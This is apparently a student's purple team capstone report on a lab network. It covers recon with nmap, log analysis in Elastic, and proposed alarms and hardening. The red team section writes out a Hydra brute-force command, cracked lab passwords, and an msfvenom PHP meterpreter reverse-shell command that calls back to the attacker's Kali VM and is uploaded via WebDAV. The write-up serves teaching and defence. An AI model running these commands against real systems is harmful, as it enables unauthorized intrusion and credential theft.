# Purple Teaming | Capstone Engagement


## Objectives


In this Purple Team exercise, I played the role of both the attacker and the defender. 

Below, is the full report, covering the red team engagement and the blue team forensics work. The report ends with a  list of proposed mitigations.

**The executive summary can be found** ![here](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/Capstone_Engagement.pdf).

**Note:** For a detailed explanation on how to deploy an Elastic Stack instance, you can access my walkthrough ![here](https://github.com/Sk3llington/Elastic_Stack_Server)


## Table of Contents

1. Network Topology
2. Red Team: Security Assessment
3. Blue Team: Log Analysis and Attack Characterization
4. Hardening: Proposed Alarms and Mitigation Strategies


### Network Topology


![network_diagram](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/Network_Diagram.drawio.png)


##### Network

- IP Range: 192.168.1.0/24
- Netmask: 255.255.255.0
- Gateway: 192.168.1.1

##### Machines


|     IPv4      |  OS   | Hostname |
| ------------- |:-----:| :-------:|
| 192.168.1.90  | Linux | Kali     |
| 192.168.1.100 | Linux | ELK      |
| 192.168.1.105 | Linux | Capstone |



## Red Team Engagement | Security Assessment

Today, I will act as an offensive security Red Teamer to exploit a vulnerable Capstone Virtual Machine.

### The following tools will be used for this red team engagement:

- Firefox
- Hydra
- Nmap
- Crack Station
- Metasploit
- msfvenom


Now, it's time to search for the target webserver.

### Below, the `nmap` command I used to discover the IP address of the Linux web server and have all IPs discovered saved into the file `nmap_scanned_ips`:

```bash
nmap -sn 192.168.0.0/24 | awk '/Nmap scan/{gsub(/[()]/,"",$NF); print $NF > "nmap_scanned_ips"}'
```

Below is the list of IPs that Nmap has discovered on my virtual private network:

![nmap_scanned_ips](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/nmap_scanned_ips.png)


Next, I run a service scan on all IPs except the IP of my Kali VM machine (192.168.1.90):


![nmap_webserver_nmap_lookup](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/nmap_webserver_nmap_lookup.png)


I found the Linux Apache webserver I was looking for with the IP address `192.168.1.105` on port `80`.

Next, I open a web browser to access the webserver:

![webserver_webdirectory](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/webserver_web_directory.png)


### Next, I am tasked with finding a secret folder and break into it. I used Firefox to navigate to the address of the webserver and start my reconnaissance work.

After reading the company's blog I found a lead on the location of the secret folder:

> 192.168.1.105/company_folder/company_culture/file1.txt

![secret_folder_clue](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/secret_folder_clue.png)

Next, in the "meet our team" section I found an interesting text file with a clue about who is in charge of the folder. His name is Ashton:

> 192.168.1.105/meet_our_team/ashton.txt

![secret_folder_admin_ashton](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/secret_folder_admin_ashton.png)


### Next, I used `Hydra` to brute force the access to the secret folder located at /company_folders/secret_folder.

I used the following command to brute force the access to the web page using `ashton` as the username and the `rockyou.txt` wordlist to brute force his password:


```bash
hydra -l ashton -P /usr/share/wordlists/rockyou.txt -s 80 -f -vV 192.168.1.105 http-get /company_folders/secret_folder
```


After 10,143 attempts, the password was cracked:

![hydra_brute_forced_password](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/hydra_brute_forced_passwd.png)

Next, I use Ashton's credentials, i.e., username: `ashton` and password: `leopoldo`, to acces the 'secret_folder'. In the secret folder I found a note that he left to himself, detailing how to connect to the company's webdav server:

> 192.168.1.105/company_folders/secret_folder/connect_to_corp_server

![ashton_instruction_webdav](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/ashton_instructions_connect_webdav.png)


I noticed that a hash for ryan's account is displayed on the page. I decided to use the 'Crack Station' website to try to crack it. It was successful and I obtained what seems to be a password, i.e., `linux4u`.

![crack_station_cracked_hash](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/Crack_station_cracked_hash.png)


Next, from the details left by Ashton on how to connect to the Webdav server, I figured out the path using the updated IP address (current address of the webserver 192.168.1.105) of their server and successfully accessed the login window and authenticated with the cracked credentials   `Ryan:linux4u` (i.e., Username: `Ryan` and password: `linux4u`).

![webdav_access_window](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/webdav_access_windows.png)

![enter_pass_webdav](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/enter_pass_webdav.png)

**Successfully logged in:**

![webdav_success_access](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/webdav_success_access.png)


### Following the successful connection to the Webdav server, I dropped a PHP reverse Shell payload to gain remote access.

I used `msfvenom` to create my payload file named `exploit.php` with the following command:

```bash
/usr/bin/msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.90 LPORT=4444 R > exploit.php
```

![php_payload_creation](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/php_payload_creation.png)


Next, I uploaded the reverse shell payload (exploit.php file) into the Webdav server:

![copy_paste_exploitPHP_in_webdav](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/copy_paste_exploitPHP_in_webdav.png)


Once my malicious "exploit.php" file was uploaded to the server, I opened `Metasploit` to connect to the web shell and started a meterpreter session, giving me remote access to the target machine and the freedom to explore the file system and further compromise the system and move laterally:


![meterpreter_session_started](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/meterpreter_session_started.png)


Once inside the target machine, I had access to all files. Next, I managed to find the flag I was tasked to capture:


![flag_found](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/flag_found.png)


# Blue Team | Log Analysis and Attack Characterization


## Identifying the offensive traffic


A considerable amount of data is available in the logs. Upon inspection, I was able to identify the malicious traffic and activity generated by my attacking machine.
Through the log inspection, I was able to obtain the following evidence of malicious activity:

- Traffic between my attacking VM and target VM, more specifically, the unusually high volume of requests
- Acces to the 'secret_folder' directory
- The brute force attack against the HTTP server
- The POST request corresponding to the upload of the 'exploit.php' file

Below, the unusually high volume of requests and failed responses between my attacking VM and the target:


![identifying_port_scan](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/identifying_port_scan.png)

The requests were made from the IP address **`192.168.1.90`**, my Kali Virtual Machine used to attack the target.

![identifying_port_scan](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/identifying_port_scan_2.png)

![error_vs_success_transac](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/brute_force_attack_error_vs_successful_transac.png)

I can see the high volume of login attempts which shows that the interaction between the attacker and the target machine occured on Sep 15, 2021 @ 02:55:00.

Since I know when the interaction between my attacking machine and the target machine occured, I set the date and time to Sep 15, 2021 @ 02:55:00 and filter out the "HTTP Status Codes For The Top Queries" results. Next, I look at the top responses that the target machine sent back. The codes returned are `401`, `301`, `200`, `403`, `204`.

![responses_sent_back_by_victim](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/responses_sent_back_by_victim.png)

I can see the high volumes of login attempts, with a high volume of `401` response code indicating unauthenticated users failing to login generated by "Hydra" during the brute force attack.


## Finding the request for the hidden directory

### Access to sensitive data:

107,601 requests were made to the hidden directory 'secret_folder'. between Sep 15, 2021 @ 02:55:00 and Sep 15, 2021 @ 03:12:00


![requested_file_report](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/requested_file_report.png)

Below, the additional requests made after the successful brute force attack, i.e., the attacker successfully gaining access to the 'secret_folder/'. The attacker accessed the folder **6** times out of **107,601** attempts.


![brute_force_attack_proof](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/brute_force_attack_proof_report.png)


### HTTP brute force attack

When searching for the `url.path` "/company_folders/secret_folder/", I found the evidence of the HTTP brute force attack that allowed me access to the 'secret_folder' during the red team engagement. I was also able to find clues that `Hydra` was used for the brute force attack by looking at the section `user_agent.original`:

![brute_force_hydra_clue](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/brute_force_Hydra_clue.png)

We can also see the evidence of the brute force attack with the graph below showing the high volume of `401` error response codes returned caused by multiple unsuccessful attempts at accessing the 'secret_folder':

![responses_sent_back_by_victim](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/responses_sent_back_by_victim.png)


### Identifying the Webdav connection and upload of the `exploit.php` file

The logs indicate that an unauthorized actor was able to access protected data in the 'Webdav' directory. I can see that the 'passwd.dav' file was requested via GET, and 'exploit.php' was uploaded via POST.

![webdav_directory_requests](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/webdav_directory_requests.png)


## Hardening | Proposed Alarms and Mitigation Strategies


### Blocking the Port Scan

#### Alarm:

- Alarms should trigger if a given IP address sends more than 10 requests per second for more than 5 seconds.

#### System hardening:

- Filter ICMP traffic.
- Enable an allowed IP list.
- Close unused ports or block them with a firewall.
- Proactive scan to identify running services and potential vulnerabilities to address.



### Finding the Request for the Hidden Directory

#### Alarm:

- Alarms should trigger if an IP that is not on the whitelist attempts to connect.

#### System Hardening:

- Access to the sensitive file(s) can be locally restricted to a specific user.
- Move folder to server with key-based SSH access from whitelisted IPs.
- Encryption of file(s) at rest.
- Log non whitelisted IPs access to the folder.



### Preventing Brute Force Attacks

#### Alarm:

- Alarms should trigger when more than 100 requests per seconds for a duration of 5 seconds is detected.
- Alarms should trigger when an IP address that is not on the whitelist is trying to authenticate.


#### System Hardening:

- Configuring fail2ban or a similar utility would mitigate brute force attacks.
- Limit failed login attempts.
- Limit logins to a specified IP address.
- Two factor authentication.
- Unique login URLs.



### Detecting the WebDAV connection

#### Alarm:

- Alarms should trigger by any read performed on files within webdav OR trigger by any unauthorized users’ activity within it.


#### System Hardening:

- Administrators must install and configure Filebeat on the host to monitor WebDAV-related activity.
- Use Restrict Access function to create an ACL that restricts access to WebDAV-enabled resources defining what is allowed and who can perform an allowed action.



### Identifying Reverse Shell Uploads

#### Alarm:

- Alarms should trigger upon receipt of any POST request containing a form or file data of an unauthorized file type, e.g., “.php”.


#### System Hardening:

- Write permissions can be restricted on the host.
- Uploads can be isolated into a sandboxed partition/folder.
- Filebeat should be enabled and configured to monitor file uploads as well as activity in any sandboxed environment.
- Require authentication to upload files.
- Block upload of executable files.

